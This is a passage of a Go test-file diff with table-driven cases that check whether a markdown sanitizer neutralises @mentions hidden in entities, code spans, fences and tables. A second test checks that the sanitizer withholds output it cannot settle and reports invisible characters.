+		{"an email, a leading dot", "a@.example", true},
+		{"a named entity", "&commat;smana", true},
+		{"a numeric entity", "&#64;smana", true},
+		{"a hex entity", "&#X40;smana", true},
+		{"an advisory", "GHSA-4jq9-2xhw-jpx7", true},
+		{"a cve", "CVE-2021-44228", true},
+		{"indented code", "    @smana", true},
+		{"a nested fence", "- ```\n  @smana\n  ```", true},
+		{"a table cell", "| a |\n|---|\n| @smana |", true},
+		{"a span crossing lines", "`a\nb @smana`", true},
+		{"a backtick left open on the line before", "`a\nb `c @smana` d", true},
+		{"an open backtick ends at a blank line", "`a\n\n`@smana`", false},
+		{"a pipe in a span, in a table", "| a |\n|---|\n| `x | @smana b` |", true},
+		{"a span as math", "$`@smana`$", true},
+		{"a double span as math", "$``@smana``$", true},
+		{"a span beside a dollar only", "$ `@smana`$", false},
+		{"an indented fence flips the column-0 pair", "  ```\n```\n@smana\n```\n  ```", true},
+		{"an unclosed fence", "```\nx", true},
+		{"a fence closed short", "````\nx\n```", true},
+		{"a fence with backticks in its info is no fence", "``` a`b\n@smana\n```", true},
+		{"a tag before a fence still defused", "&lt;div>\n```\n@x\n```\n&lt;/div>", false},
+		{"a closer 3 spaces in closes", "```\n   ```\n@smana\n```\nx\n```", true},
+		{"a closer 2 spaces in, then a form", "~~~\n  ~~~\n@smana", true},
+		{"a closer 4 spaces in does not close", "```\n    ```\n@smana\n```", false},
+		{"a closer behind a tab does not close", "```\n\t```\n@smana\n```", false},
+		{"an indented fence left open", "x\n\n  ```\ny", true},
+		{"an indented fence left open, an empty one", "x\n  ```", true},
+		{"an indented fence, closed, nothing live", "  ```\nx\n  ```", false},
+	} {
+		t.Run(c.name, func(t *testing.T) {
+			if got := scanLive(c.in); got != c.want {
+				t.Fatalf("scanLive(%q) = %v, want %v", c.in, got, c.want)
+			}
+		})
+	}
+}
+
+// Public fails closed as Text does: a rewrite that does not settle publishes nothing.
+func TestPublicWithholdsWhatDoesNotSettle(t *testing.T) {
+	if _, ok := settle("@smana", func(s string) string { return s + "x" }); ok {
+		t.Fatal("a rewrite that never settles must not publish")
+	}
+	if _, ok := settle("[a](b)", func(s string) string { return s }); ok {
+		t.Fatal("a link the rewrite left must not publish")
+	}
+	if out, rep := Public("\u202e@smana"); rep.Withheld || rep.Invisible != 1 || out != "`@smana`" {
+		t.Fatalf("the report survives: got %q, %+v", out, rep)
+	}
+}
